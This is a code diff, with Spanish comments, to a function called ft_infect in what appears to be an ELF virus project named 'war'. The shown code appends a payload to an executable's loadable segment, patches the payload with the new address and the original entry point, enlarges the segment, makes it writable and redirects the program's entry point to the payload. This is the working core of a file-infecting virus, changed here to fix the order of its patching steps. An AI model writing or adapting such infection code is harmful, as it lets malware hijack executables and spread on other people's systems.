@@ -93,10 +93,8 @@ int     ft_is_infection(t_war *war)
 
 void    ft_infect(t_war *war)
 {
-    // unsigned char   marker_offset[] = {0xef, 0xbe, 0xad, 0xde};  // 0xDEADBEEF
-    // uint64_t        offset_signature;
     unsigned char   *payload;
-    unsigned char   marker_ret[]    = {0xbe, 0xba, 0xfe, 0xca};  // 0xCAFEBABE
+    // unsigned char   marker_ret[]    = {0xbe, 0xba, 0xfe, 0xca};
     char            full_signature[1069];
     uint64_t        new_vaddr;
     Elf64_Phdr      *phdr;
@@ -108,39 +106,27 @@ void    ft_infect(t_war *war)
     int             i = 0;
     int             phdr_index = -1;
 
-    /*  1. Copiar el payload    */
     payload = malloc(src_payload_bin_len);
     if (!payload)
         return;
     memcpy(payload, src_payload_bin, src_payload_bin_len);
 
-    /*  2. Sustituir marcadores */
-    // offset_signature = war->file_size;
-    // ft_replace_marker(payload, src_payload_bin_len, marker_offset, offset_signature);
-    ft_replace_marker(payload, src_payload_bin_len, marker_ret, war->header->e_entry);
-
-    /*  3. Modificar Program Headers y e_entry  */
     phdr = (Elf64_Phdr *)(war->elf + war->header->e_phoff);
 
     while (i < war->header->e_phnum)
     {
-        // Buscamos un PT_LOAD ejecutable que tenga espacio detrás
         if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X))
         {
-            original_offset = phdr[i].p_offset;          
+            original_offset = phdr[i].p_offset;
             original_filesz = phdr[i].p_filesz;
-
-            new_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;             // Calcular la nueva dirección virtual
-            phdr[i].p_filesz += src_payload_bin_len;                    // Hacer sitio en el segmento (aumentar tamaños)
-            phdr[i].p_memsz += src_payload_bin_len;
-            war->header->e_entry = new_vaddr;                           // Cambiar el punto de entrada
+            new_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
             modified_phdr = phdr[i];
             phdr_index = i;
             break;
         }
         i++;
     }
-    
+
     if (phdr_index == -1)
     {
         munmap(war->elf, war->file_size);
@@ -148,6 +134,16 @@ void    ft_infect(t_war *war)
         free(payload);
         return;
     }
+
+    // AHORA new_vaddr tiene el valor correcto
+    memcpy(payload + 2, &new_vaddr, sizeof(uint64_t));
+    memcpy(payload + 10, &war->header->e_entry, sizeof(uint64_t));
+
+    phdr[phdr_index].p_filesz += src_payload_bin_len;
+    phdr[phdr_index].p_memsz += src_payload_bin_len;
+    phdr[phdr_index].p_flags |= PF_W;
+    war->header->e_entry = new_vaddr;
+    modified_phdr = phdr[phdr_index];
 
     /*  4. Escribir en el disco   */
     new_entry = war->header->e_entry;
